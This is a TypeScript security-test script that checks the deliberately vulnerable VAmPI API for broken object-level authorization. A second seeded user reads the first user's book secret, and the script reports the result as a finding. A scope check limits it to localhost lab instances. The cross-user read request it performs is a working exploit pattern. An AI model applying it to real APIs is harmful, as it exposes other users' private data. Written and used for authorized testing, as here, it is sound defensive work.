// Red-team probe for VAmPI's book-access BOLA (OWASP API1:2023 / WSTG-ATHZ-04).
// Uses the CANONICAL seeded identities (name1/name2) and the canonical book that
// scripts/seed-vampi.sh plants, so the evidence is deterministic and matches the
// execution contract (redteam/vampi-contract.md). Run seed-vampi.sh first.
//
// name1 owns the book; name2 (foreign user) reads it by title. vulnerable=1 -> 200 + secret
// (bug); fixed -> 404. Emits the shared Finding JSON. Scope-guarded to owned VAmPI instances.
import { postFinding } from "./post.ts";

const TARGET = process.env.TARGET_URL ?? "http://127.0.0.1:5002";
const ALLOWED = (process.env.ALLOWED_TARGETS ?? "http://127.0.0.1:5001,http://127.0.0.1:5002,http://localhost:5001,http://localhost:5002").split(",");

const OWNER = { username: "name1", password: "pass1" };
const ATTACKER = { username: "name2", password: "pass2" };
const BOOK_TITLE = "restorelab-bola-book";
const BOOK_SECRET = "S3CR3T-name1-canonical";

function assertScope() {
  if (!ALLOWED.some((a) => TARGET.startsWith(a.trim()))) {
    console.error(`refusing: ${TARGET} is not in ALLOWED_TARGETS. This probe runs only against owned VAmPI instances.`);
    process.exit(2);
  }
}

async function call(method: string, path: string, body?: unknown, token?: string) {
  const res = await fetch(`${TARGET}${path}`, {
    method,
    headers: { "content-type": "application/json", ...(token ? { authorization: `Bearer ${token}` } : {}) },
    body: body ? JSON.stringify(body) : undefined,
  });
  return { status: res.status, body: await res.json().catch(() => ({})) };
}

async function login(u: typeof OWNER): Promise<string> {
  const r = await call("POST", "/users/v1/login", u);
  if (!r.body?.auth_token) throw new Error(`login failed for ${u.username}: ${JSON.stringify(r.body)}. Run scripts/seed-vampi.sh first.`);
  return r.body.auth_token;
}

async function main() {
  assertScope();
  const ownerTok = await login(OWNER);
  const attackerTok = await login(ATTACKER);

  // Self-heal: if the canonical book isn't seeded, plant it (keeps the probe runnable standalone).
  const ownRead = await call("GET", `/books/v1/${BOOK_TITLE}`, undefined, ownerTok);
  if (ownRead.status === 404) await call("POST", "/books/v1", { book_title: BOOK_TITLE, secret: BOOK_SECRET }, ownerTok);
  const own = await call("GET", `/books/v1/${BOOK_TITLE}`, undefined, ownerTok);

  // Attack: the foreign user reads the owner's book by title.
  const attack = await call("GET", `/books/v1/${BOOK_TITLE}`, undefined, attackerTok);
  const reproduced = attack.status === 200 && typeof attack.body?.secret === "string";

  const finding = {
    category: "OWASP-API1-2023" as const,
    title: "Broken Object Level Authorization: cross-user book-secret read (VAmPI)",
    classification: { owasp: "API1:2023", wstg: "WSTG-ATHZ-04", asvs: "ASVS 5.0 V8.2.2" },
    targetScope: TARGET,
    target: "VAmPI @ f16052dce83f05847133ec98f01c5193a41de7d8",
    operation: `GET /books/v1/${BOOK_TITLE}`,
    reproduced,
    evidence: {
      ownerRead: { request: `${OWNER.username} GET own book`, status: own.status, owner: own.body?.owner ?? null },
      crossUserRead: { request: `${ATTACKER.username} GET ${OWNER.username}'s book`, status: attack.status, leakedSecret: attack.body?.secret ?? null, owner: attack.body?.owner ?? null },
    },
    reproductionSteps: [
      "scripts/seed-vampi.sh <target>  (createdb + seed canonical book owned by name1)",
      `Log in as ${ATTACKER.username} (a different user).`,
      `GET /books/v1/${BOOK_TITLE}.`,
      "vulnerable=1 returns 200 with name1's secret; a fixed build returns 404.",
    ],
    observedAt: new Date().toISOString(),
  };

  console.log(JSON.stringify(finding, null, 2));
  console.error(reproduced
    ? `\nBOLA REPRODUCED on VAmPI: ${ATTACKER.username} read ${OWNER.username}'s secret.`
    : "\nNot reproduced: cross-user read denied (target appears fixed).");

  await postFinding(finding, { baseFixtureId: "vampi@f16052dc", targetVersion: "f16052dce83f05847133ec98f01c5193a41de7d8" });
}

main().catch((e) => { console.error(e); process.exit(1); });
